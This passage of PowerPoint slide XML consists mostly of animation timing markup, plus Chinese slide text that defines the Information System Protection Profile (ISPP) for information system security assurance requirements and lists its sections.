                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="38" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="157"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="39" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="157"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="40" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="7000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="41" presetID="53" presetClass="entr" presetSubtype="16" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="42" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="158"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="43" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="158"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="44" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="158"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="45" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="158"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="46" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="7500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="47" presetID="47" presetClass="entr" presetSubtype="0" fill="hold" grpId="0" nodeType="after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1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="38"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="50" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="38"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="51" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="38"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_y-.1"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="52" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="8500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="53" presetID="47" presetClass="entr" presetSubtype="0" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="54" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="159"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="55" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="159"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="56" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="159"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="57" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="159"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_y-.1"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="58" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="9500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="59" presetID="47" presetClass="entr" presetSubtype="0" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="60" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="160"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="61" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="160"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="62" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="160"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="63" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="160"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_y-.1"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="64" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="10500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="65" presetID="47" presetClass="entr" presetSubtype="0" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="66" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="161"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="67" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="161"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="68" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="161"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="69" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="161"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_y-.1"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="70" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="11500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="71" presetID="53" presetClass="entr" presetSubtype="16" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="72" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="162"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="73" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="162"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="74" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="162"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="75" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="162"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="76" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="12000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="77" presetID="53" presetClass="entr" presetSubtype="16" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="78" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="7"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="79" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="80" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="8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715689"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>标准化的安全保障需求文档</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>-ISPP</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="2382118"/>
            <a:ext cx="8191500" cy="3272314"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>信息系统安全保障的具体需求由</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
              </a:rPr>
              <a:t>信息系统保护轮廓</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>ISPP)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>确定</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
              <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>信息系统保护轮廓（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>ISPP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>）是根据组织机构使命和所处的运行环境，从组织机构的策略和风险的实际情况出发，对具体信息系统安全保障需求和能力进行具体描述。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>表达一类产品或系统的安全目的和要求。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>ISPP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>是从信息系统的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>所有者（用户）的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>角度规范化、结构化的描述信息系统安全保障需求。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="683568" y="1530975"/>
            <a:ext cx="7200800" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:srgbClr val="FFCC99"/>
              </a:gs>
              <a:gs pos="50000">
                <a:schemeClr val="bg1"/>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="FFCC99"/>
              </a:gs>
            </a:gsLst>
            <a:lin ang="5400000" scaled="1"/>
          </a:gradFill>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ISPP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="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(Information System Protect Profile)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13997771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0187" y="734345"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>规范化保障需求</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="600187" y="1628800"/>
            <a:ext cx="3590813" cy="3717776"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="363538" indent="-363538"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>ISPP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>引言</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="363538" indent="-363538"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>信息系统描述</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="363538" indent="-363538"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>信息系统安全环境</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="363538" indent="-363538"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全保障目的</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="363538" indent="-363538"/>
            <a:r>
